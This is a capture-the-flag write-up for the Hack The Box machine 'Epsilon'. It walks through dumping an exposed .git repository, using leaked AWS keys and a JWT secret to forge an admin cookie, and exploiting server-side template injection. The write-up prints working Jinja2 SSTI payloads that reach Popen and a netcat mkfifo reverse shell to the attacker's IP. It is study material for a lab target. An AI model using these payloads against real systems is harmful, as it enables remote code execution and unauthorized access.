# Epsilon
### Epsilon Machine(10.10.11.134)

![Screenshot from 2022-02-08 22-32-33](https://user-images.githubusercontent.com/79413473/153037809-0329e042-a149-43dd-8a54-442184fe8962.png)
## Recon:
+ Add *epsilon.htb* to hosts file.
+ Runing Port Scan we get 3 open ports
 ```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41
| http-git: 
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Costume Shop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```  
+ Port 80 is apache & port 5000 is running python costume shop application.
+ As shown in scan port 80 is *403 Forbidden* & have a **.git** directory that also is 403. Files like .**git/config & .git/HEAD** are accessible we will use 
  [GitTools](https://github.com/internetwache/GitTools) tool to dump this git directory and extract cotent from this .git file.
+ Port 5000 web application have a login panel, default & easy to guess passwords doesn't work.

![Screenshot from 2022-02-08 22-41-19](https://user-images.githubusercontent.com/79413473/153039325-416031ed-72ef-4330-ab7e-b30cc0519997.png)

+ Running ffuf on this application we get three directories
 ```
home
order
track

 ```
 + visiting **/track** will welcome you as **admin** but moment you interact with it you will redirected to loginn page like other pages. suggesting session is being checked at server.
 
 ## Foothold: Admin access by AWS leak & exploiting SSTI
 
+ As for now we have nothing other than **.git** directory which often leak stuffs.
+ Read *gittools docs* and you can dump the git directory using this command `./gitdumper.sh http://epsilon.htb/.git/ tmp_dir`
+ Now from this directory you can extract actual commits `./extractor.sh tmp_dir ./git`
+ Now you can read surce code and find that there are some AWS keys leaks & new endpoint.
 ```
 session = Session(
    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
    region_name='us-east-1',
    endpoint_url='http://cloud.epsilong.htb') #this is a typo it's epsilon
aws_lambda = session.client('lambda')   
```
+ Accessing cloud.epsilon.htb will give you 403 in browser guess it's not accessible this way.
+ Let's add these keys to our **[aws cli](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html)**  and we can access aws lambda from our terminal.

*What is AWS LAMBDA?
AWS lambda provides service to  run your code on particular events or triggers. Mainly used in backend application to manage websites
Official Link: [CLick](https://aws.amazon.com/lambda/features/)*

+ run **aws configure** and add keys and region or manually paste keys in your **~/.aws/credentials** & region in **~/.aws/config** file.
+ You can learn more about aws lambda by **aws lambda help** it will give you all possible commands to run. One of our use is **list-functions & get-function**
+ Run `aws lambda list-functions` and you will get following error:
 `An error occurred (UnrecognizedClientException) when calling the ListFunctions operation: The security token included in the request is invalid`
+ Guess it also needs specify endpoint url , needed to take help from walkthrough.
+ `aws lambda list-functions --endpoint-url=http://cloud.epsilon.htb`
 ![Screenshot from 2022-02-08 23-08-00](https://user-images.githubusercontent.com/79413473/153044152-3a86cfce-562a-4c93-aba9-732490d7d526.png)

+ Let's fetch **costume_shop_v1** fucntion contents , `aws lambda get-function --function-name=costume_shop_v1 --endpoint-url=http://cloud.epsilon.htb`
![Screenshot from 2022-02-08 23-09-53](https://user-images.githubusercontent.com/79413473/153044411-4f2ae4a1-0cf5-485e-9ee9-f784564e2e38.png)

+ It reveals *Location of code*, Download it and unzip the file you will get some more code.
```
import json

secret='RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124

'''Beta release for tracking'''
def lambda_handler(event, context):
    try:
        id=event['queryStringParameters']['order_id']
        if id:
            return {
               'statusCode': 200,
               'body': json.dumps(str(resp)) #dynamodb tracking for CR-342
            }
        else:
            return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
    except:
        return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
```  

+ Basic lambda fucntion for order tracking but interesting thing is secret key.
+ Now if you take a look on python source code of application 
```

@app.route("/", methods=["GET","POST"])
def index():
	if request.method=="POST":
		if request.form['username']=="admin" and request.form['password']=="admin":
			res = make_response()
			username=request.form['username']
			token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
			res.set_cookie("auth",token)
			res.headers['location']='/home'
			return res,302
		else:
			return render_template('index.html')
	else:
		return render_template('index.html')
``` 
+ it sets jwt token in cookie **auth** and there is a secret used to sign this cookie. This secret could be a potential secret for that and it doesn't hurt to try. Btw this *admin:admin* creds doesn't work.
+ Let's create a jwt token in python
```
>>> import jwt
>>> secret='RrXCv`mrNe!K!4+5`wYq'
>>> token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
>>> token
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg'
>>> 
```  
+ set Cookie **auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg** in browser and you have full access.
![Screenshot from 2022-02-08 23-19-48](https://user-images.githubusercontent.com/79413473/153046186-227226e3-9f96-48be-b3df-e66d6fcdb867.png)

+ On order page you can place new orders and it reflect you input

![2022-02-08_23-24](https://user-images.githubusercontent.com/79413473/153046917-6555527a-4eeb-4c83-8082-ca913b5abea1.png)

+ FIrst thing comes to mind is to check for xss, and indeed it is vulnerable to HTML injection,& XSS but it's of no use as we are already admin and no one is interacting with it and it's self xss it's not getting stored anywhere.
 ![Screenshot from 2022-02-08 23-27-03](https://user-images.githubusercontent.com/79413473/153047378-170939b0-27e1-433d-9bac-3f952ea4d328.png)
by setting `costume=glasses</p><h1>INJECTION</h1>`.

+ As it is a python application and input is reflected SSTI(Server Side Template INjection) only thing that could be tested now, and ofcourse machine tag has it :)
+ As expected `{{7*7}}` truns into **Your order of "49" has been placed successfully.**
 ### Creating exploit
 1. In python **[`.__class__`](https://docs.python.org/release/2.6.4/library/stdtypes.html#instance.__class__)** will tell to which class your current instance belongs to.
 ![Screenshot from 2022-02-08 23-42-02](https://user-images.githubusercontent.com/79413473/153049767-d552a80b-f752-43a2-ae73-289a6dcfd0c0.png)
`costume={{ ''.__class__ }}` tells it's an string class.
2. **[`__mro__`](https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__)** is an attribute of a class which tells base/parent class of this object.
`costume={{ ''.__class__.__mro__ }}` will show 
![Screenshot from 2022-02-08 23-47-15](https://user-images.githubusercontent.com/79413473/153050613-b77558f8-1edd-42e0-bd5b-09d9efb3062a.png)
3. Now as we want to climb up to root object we will access with `[1]`
4. Now we want to see how many subclasses are accessible through this root onject [`__subclasses__()`](https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__subclasses__). 
`costume={{ ''.__class__.__mro__[1].__subclasses__() }}` will return list of subclasses accessbile.
![Screenshot from 2022-02-08 23-51-33](https://user-images.githubusercontent.com/79413473/153051393-a27459b2-a1cd-43e4-93bd-ee04e58f575f.png)
5. From this haystack of list we need to find the needle i.e popen module which will execute the command. here that is at index of 389, used some find and replace all trick in sublime.
6. `costume={{ ''.__class__.__mro__[1].__subclasses__()[389]("id",shell=True,stdout=-1).communicate() }}` now through 389 we are accessing popen and providing it arguments to process & communicate() to read output  by interacting with process by sending data to stdin and reading from stdout or stderr.
![Screenshot from 2022-02-08 23-59-11](https://user-images.githubusercontent.com/79413473/153052383-a40e6ba0-2959-4b42-9dfa-b1b97282023e.png)

+ As now we have command executing we should get a shell and have your listener ready. I used this reverse shell `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f` .Also needed to url encode only revshell part to make it work. Otherwise 500 server error.

`costume={{ ''.__class__.__mro__[1].__subclasses__()[389]("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.29+8082+>/tmp/f",shell=True,stdout=-1).communicate() }}`
![Screenshot from 2022-02-09 00-02-53](https://user-images.githubusercontent.com/79413473/153052905-2c369163-7602-4e86-8a60-79674fc5fd89.png)






